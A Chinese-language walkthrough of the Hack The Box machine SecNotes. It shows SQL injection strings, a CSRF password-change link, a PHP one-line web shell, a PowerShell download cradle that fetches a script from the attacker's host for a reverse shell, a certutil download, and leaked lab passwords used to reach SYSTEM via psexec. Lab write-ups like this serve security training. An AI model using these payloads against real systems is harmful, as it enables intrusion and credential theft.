# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 服务探测

查看开放端口
```
┌──(root💀kali)-[~/htb/SecNotes]
└─# nmap --open 10.10.10.97 -p-                                                                               130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-10 22:58 EST
Nmap scan report for 10.10.10.97
Host is up (0.31s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
8808/tcp open  ssports-bcast

Nmap done: 1 IP address (1 host up) scanned in 605.16 seconds

```

查看端口详细信息
```
┌──(root💀kali)-[~/htb/SecNotes]
└─# nmap -sV -Pn -A -O 10.10.10.97 -p 80,445,8808
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-10 23:36 EST
Nmap scan report for 10.10.10.97
Host is up (0.27s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2022-01-10T20:36:21-08:00
|_clock-skew: mean: 2h39m53s, deviation: 4h37m10s, median: -8s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-01-11T04:36:20
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   290.77 ms 10.10.14.1
2   290.96 ms 10.10.10.97

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.25 seconds

```

# 445

没有用户凭证什么都看不了，等我们收集到一个用户登录信息再回来。

# 80

目录爆破
```
┌──(root㉿ss)-[~/htb]
└─# python3 /root/dirsearch/dirsearch.py -e* -u http://10.10.10.97                                                                       

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 30 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.97/_22-06-02_05-07-26.txt

Error Log: /root/dirsearch/logs/errors-22-06-02_05-07-26.log

Target: http://10.10.10.97/

[05:07:26] Starting:         
[05:07:46] 500 -    1KB - /auth.php                                           
[05:07:50] 302 -    0B  - /contact.php  ->  login.php                       
[05:07:52] 500 -    1KB - /db.php                                           
[05:07:57] 302 -    0B  - /home.php  ->  login.php                          
[05:08:01] 200 -    1KB - /login.php                                        
[05:08:02] 302 -    0B  - /logout.php  ->  login.php                        
[05:08:11] 200 -    2KB - /register.php    
```


这个cms可以自由注册

我们尝试注册一个账户，看到contact.php暴露出一个用户名：tyler
```
Contact Us

Please enter your message
To: tyler@secnotes.htb
Message:
```

我们尝试使用tyler的名称注册，提示
```
This username is already taken.
```

说明是存在这个用户的，说不定登录进去以后还能看到tyler的留言或者登录smb，我们现在需要tyler的密码

## sql注入

注册时的名字存在sql注入，字段：username

注入的结果需要登录进去以后才能回显

且这个字段的字符长度，经过测试最多只允许50个字符

注入格式
```
admin' or 1=1 #
```

回显字段:2,3,4都会回显
```
admin ' union select 1,2,3,4# 
2, 3 ,4
```

数据库名字和版本
```
admin ' union select 1,database(),3,version()#  
secnotes, 3 ,8.0.11
```

当前用户
```
admin ' union select 1,system_user(), 3 ,user()# 
secnotes@localhost,3,secnotes@localhost
```

想要获取表名，但是超过了username的长度限制.



# XSRF

什么是XSRF?
维基这样解释：
> 跨站请求伪造，也被称为one-click attack 或者 session riding，通常缩写为CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。


## contact.php
这个页面要求我们输入一段文本，当我们构造一个特殊的payload，比如本机的http链接
```
http://10.10.16.4/any
```

点击发送以后，在我们本机的web服务可以看见有访问的请求

```
┌──(root💀kali)-[~/htb/SecNotes]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.97 - - [02/Jun/2022 06:05:55] code 404, message File not found
10.10.10.97 - - [02/Jun/2022 06:05:55] "GET /any HTTP/1.1" 404 -

```

也就是说无论我们发送什么链接，用户tyler都会去点击

这个有点客户端攻击的意思了。

## change_pass.php

在修改密码页面，只需要输入两个参数，password和confirm_password

在form表单里是通过POST请求的，那能不能使用GET请求呢？

使用burp截断POST
```
POST /change_pass.php HTTP/1.1
Host: 10.10.10.97
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: http://10.10.10.97
Connection: close
Referer: http://10.10.10.97/change_pass.php
Cookie: PHPSESSID=rsiqvoieb29ln9kke0ab561bve
Upgrade-Insecure-Requests: 1


password=654321&confirm_password=654321&submit=submit
```


我们构造一个payload测试

```
curl -v --cookie "PHPSESSID=rsiqvoieb29ln9kke0ab561bve" 'http://10.10.10.97/change_pass.php?password=654321&confirm_password=654321&submit=submit'
```

然后使用```admin:654321```登陆

发现可以成功修改密码

现在我们只需要把下面的payload放在contact.php的表单里，tyler点击以后，我们就可以使用tyler的账号登录这个web app了

```
http://10.10.10.97/change_pass.php?password=654321&confirm_password=654321&submit=submit
```


现在使用```tyler:654321```可以登录到后台

发现3个note

1. Mimi's Sticky Buns[2018-06-21 09:47:17]
```
Ingredients
    For Dough
        1 heaping Tbs. (1 pkg) dry yeast
        1/4 c warm water
        scant 3/4 c buttermilk
        1 egg
        3 c flour
        1/4 shortening
        1/4 c sugar
        1 tsp baking powder
        1 tsp salt
    For Filling
        Butter
        Cinnamon
        1/4 c sugar
    For Sauce
        1/4 c butter
        1/2 c brown sugar
        2 Tbs maple syrup

Instructions
        In 9" sq pan, melt butter, and stir in brown sugar and syrup.
        In a large mixing bowl dissolve yeast in warm water.
        Add buttermilk, egg, half of the flour, shortening, sugar, baking powder, and salt.
        Blend 1/2 min low speed, then 2 min med speed.
        Stir in remaining flour and kneed 5 minutes.
        Roll dough into rectangle about the size of a cookie sheet. Spread with butter, sprinkle with 1/4 c sugar and generously with cinnamon.
        Roll up, and cut into 9 slices.
        Place in 9" pan in sauce.
        Let rise until double in size, about 1-1.5 hours.
        Bake 25-30 min at 375.
```

2. Years[2018-06-21 09:47:54]
```
1957, 1982, 1993, 2005, 2009*, and 2017
```


3. new site[2018-06-21 13:13:46]
```
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```

第三个post暴露了一个用户凭证


cme测试登录smb成功
```
┌──(root💀kali)-[~/htb/SecNotes]
└─# crackmapexec smb 10.10.10.97 -u tyler -p '92g!mA8BGjOirkL%OG*&'                                                        
SMB         10.10.10.97     445    SECNOTES         [*] Windows 10 Enterprise 17134 (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True)
SMB         10.10.10.97     445    SECNOTES         [+] SECNOTES\tyler:92g!mA8BGjOirkL%OG*& 

```


可以读写一个new-site的文件夹
```
┌──(root💀kali)-[~/htb/SecNotes]
└─# smbmap -u tyler -p '92g!mA8BGjOirkL%OG*&' -H 10.10.10.97                                                                                                                                                                            1 ⨯
[+] IP: 10.10.10.97:445 Name: 10.10.10.97                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        new-site                                                READ, WRITE

```


登录new-site，经测试就是8808站点
```
┌──(root💀kali)-[~/htb/SecNotes]
└─# smbclient -U "tyler"  \\\\10.10.10.97\\new-site                                                                 
Enter WORKGROUP\tyler's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jun  2 06:25:44 2022
  ..                                  D        0  Thu Jun  2 06:25:44 2022
  iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018

                7736063 blocks of size 4096. 3354781 blocks available
smb: \> 

```


经测试，新站点可以运行php代码，上传一句话木马

```
<?php system($_GET['cmd']);?>
```

触发payload
```
http://10.10.10.97:8808/rev.php?cmd=whoami%20/all
```


下面payload反弹一个交互shell

```
http://10.10.10.97:8808/rev.php?cmd=powershell%20IEX%20(New-Object%20Net.WebClient).DownloadString(%27http://10.10.16.4/rev.ps1%27)
```


收到一个rev shell
```
┌──(root💀kali)-[~/htb/SecNotes]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.97] 58603
Windows PowerShell running as user SECNOTES$ on SECNOTES
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\inetpub\new-site>whoami
secnotes\tyler
PS C:\inetpub\new-site> 

```


# 提权

传winpeas到靶机
```
certutil -urlcache -split -f "http://10.10.16.4/winPEASx64.exe" winPEASx64.exe
```

靶机好像运行了一个Ubuntu子系统
```
C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml


???????????? Looking for Linux shells/distributions - wsl.exe, bash.exe
    C:\Windows\System32\wsl.exe
    C:\Windows\System32\bash.exe

    Found installed WSL distribution(s) - listed below
    Run linpeas.sh in your WSL distribution(s) home folder(s).

    Distribution:      "Ubuntu-18.04"
    Root directory:    "C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs"
    Run command:       wsl.exe --distribution "Ubuntu-18.04"
```


进去系统文件夹，很明显这是一个linux的文件结构
```
PS C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs> ls


    Directory: 
    C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
da----        6/21/2018   6:03 PM                bin                                                                   
da----        6/21/2018   6:00 PM                boot                                                                  
da----        6/21/2018   6:00 PM                dev                                                                   
da----        6/22/2018   3:00 AM                etc                                                                   
da----        6/21/2018   6:00 PM                home                                                                  
da----        6/21/2018   6:00 PM                lib                                                                   
da----        6/21/2018   6:00 PM                lib64                                                                 
da----        6/21/2018   6:00 PM                media                                                                 
da----        6/21/2018   6:03 PM                mnt                                                                   
da----        6/21/2018   6:00 PM                opt                                                                   
da----        6/21/2018   6:00 PM                proc                                                                  
da----        6/22/2018   2:44 PM                root                                                                  
da----        6/21/2018   6:00 PM                run                                                                   
da----        6/22/2018   2:57 AM                sbin                                                                  
da----        6/21/2018   6:00 PM                snap                                                                  
da----        6/21/2018   6:00 PM                srv                                                                   
da----        6/21/2018   6:00 PM                sys                                                                   
da----        6/22/2018   2:25 PM                tmp                                                                   
da----        6/21/2018   6:02 PM                usr                                                                   
da----        6/21/2018   6:03 PM                var                                                                   
-a----         6/5/2022   2:32 PM          87944 init    
```

进去root文件夹，有一个bash_history文件

```
PS C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root> ls


    Directory: C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalStat
    e\rootfs\root


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        6/22/2018   2:56 AM                filesystem                                                            
-a----        6/22/2018   3:09 AM           3112 .bashrc                                                               
-a----        6/22/2018   2:41 PM            398 .bash_history                                                         
-a----        6/21/2018   6:00 PM            148 .profile 
```

查看这个文件，暴露了administrator的密码
```
PS C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root> type .bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history 
less .bash_history
exit
PS C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root>   
```


可以用smbclient进去c盘直接下载root.txt文件
```
┌──(root💀kali)-[~/htb/SecNotes]
└─# smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\10.10.10.97\\c$                                                                                                                                               130 ⨯
Try "help" to get a list of possible commands.
smb: \> ls
  $Recycle.Bin                      DHS        0  Thu Jun 21 18:24:29 2018
  bootmgr                          AHSR   395268  Fri Jul 10 07:00:31 2015
  BOOTNXT                           AHS        1  Fri Jul 10 07:00:31 2015
  Config.Msi                        DHS        0  Mon Jan 25 10:24:50 2021
  Distros                             D        0  Thu Jun 21 18:07:52 2018
  Documents and Settings          DHSrn        0  Fri Jul 10 08:21:38 2015
  inetpub                             D        0  Thu Jun 21 21:47:33 2018
  Microsoft                           D        0  Fri Jun 22 17:09:10 2018
  pagefile.sys                      AHS 738197504  Sun Jun  5 13:46:04 2022
  PerfLogs                            D        0  Wed Apr 11 19:38:20 2018
  php7                                D        0  Thu Jun 21 11:15:24 2018
  Program Files                      DR        0  Tue Jan 26 05:39:51 2021
  Program Files (x86)                DR        0  Tue Jan 26 05:38:26 2021
  ProgramData                        DH        0  Sun Aug 19 17:56:49 2018
  Recovery                         DHSn        0  Thu Jun 21 17:52:17 2018
  swapfile.sys                      AHS 16777216  Sun Jun  5 13:46:04 2022
  System Volume Information         DHS        0  Thu Jun 21 17:53:13 2018
  Ubuntu.zip                          A 201749452  Thu Jun 21 18:07:28 2018
  Users                              DR        0  Thu Jun 21 18:00:39 2018
  Windows                             D        0  Sun Jun  5 17:38:52 2022

                7736063 blocks of size 4096. 3385729 blocks available
smb: \> cd users/administrator/desktop
smb: \users\administrator\desktop\> ls
  .                                  DR        0  Tue Jan 26 05:39:01 2021
  ..                                 DR        0  Tue Jan 26 05:39:01 2021
  desktop.ini                       AHS      282  Sun Aug 19 13:01:17 2018
  Microsoft Edge.lnk                  A     1417  Fri Jun 22 19:45:06 2018
  root.txt                           AR       34  Sun Jun  5 13:46:58 2022

                7736063 blocks of size 4096. 3385729 blocks available
smb: \users\administrator\desktop\> get root.txt
getting file \users\administrator\desktop\root.txt of size 34 as root.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)

```

也可以开一个交互shell

```
┌──(root💀kali)-[~/htb/SecNotes]
└─# python3 /usr/share/doc/python3-impacket/examples/psexec.py  Administrator@10.10.10.97
Impacket v0.9.25.dev1+20220218.140931.6042675a - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.97.....
[*] Found writable share ADMIN$
[*] Uploading file SyLdMnhk.exe
[*] Opening SVCManager on 10.10.10.97.....
[*] Creating service ilfT on 10.10.10.97.....
[*] Starting service ilfT.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
nt authority\system

C:\WINDOWS\system32>ipconfig
 
Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : htb
   IPv6 Address. . . . . . . . . . . : dead:beef::18c
   IPv6 Address. . . . . . . . . . . : dead:beef::182f:48b4:92e0:91de
   Temporary IPv6 Address. . . . . . : dead:beef::719d:2e80:dcda:3307
   Link-local IPv6 Address . . . . . : fe80::182f:48b4:92e0:91de%11
   IPv4 Address. . . . . . . . . . . : 10.10.10.97
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:a59d%11
                                       10.10.10.2

C:\WINDOWS\system32>

```

